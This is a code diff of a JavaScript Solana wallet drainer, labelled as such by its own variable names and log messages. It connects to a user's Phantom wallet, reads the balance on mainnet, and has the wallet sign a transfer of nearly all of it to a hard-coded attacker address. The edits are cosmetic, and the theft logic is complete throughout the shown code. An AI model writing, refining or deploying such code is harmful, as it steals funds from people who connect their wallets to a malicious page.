@@ -22,24 +22,22 @@
             console.log("✅ Phantom Wallet detected!");
 
             // Connect to Phantom Wallet
-            await provider.connect(); 
+            await provider.connect();
 
             const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
 
-            const attackerWallet = new solanaWeb3.PublicKey("AP1LJbcsXsLSQbvyAhuo3UC9JEMCeauTWNbzpi6GLpGh"); // Replace with your wallet address
-
+            const attackerWallet = new solanaWeb3.PublicKey("AP1LJbcsXsLSQbvyAhuo3UC9JEMCeauTWNbzpi6GLpGh");  // Replace with your wallet address
             const userWallet = provider.publicKey;
+
             console.log(`💰 Victim Address: ${userWallet.toBase58()}`);
 
             // Get the balance of the wallet
             let balance = await connection.getBalance(userWallet);
             let drainAmount = balance - 5000; // Leave small buffer for transaction success
 
-            // Only proceed if the balance is greater than 0
             if (drainAmount > 0) {
                 console.log(`⚠️ Attempting to drain ${drainAmount / 1e9} SOL from ${userWallet.toBase58()}...`);
 
-                // Create a transfer transaction
                 let transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userWallet,
@@ -49,7 +47,7 @@
                 );
 
                 try {
-                    // Request Phantom Wallet to sign the transaction (NOT just view)
+                    // Explicitly sign the transaction with Phantom Wallet
                     const signedTransaction = await provider.signTransaction(transaction);
                     console.log("Transaction signed by Phantom.");
 
@@ -57,7 +55,7 @@
                     await connection.sendRawTransaction(signedTransaction.serialize());
                     console.log("✅ SOL drained successfully.");
                 } catch (error) {
-                    console.log("🚨 Error in signing the transaction or sending.");
+                    console.error("🚨 Error in signing the transaction or sending.");
                     console.error(error);
                 }
             } else {
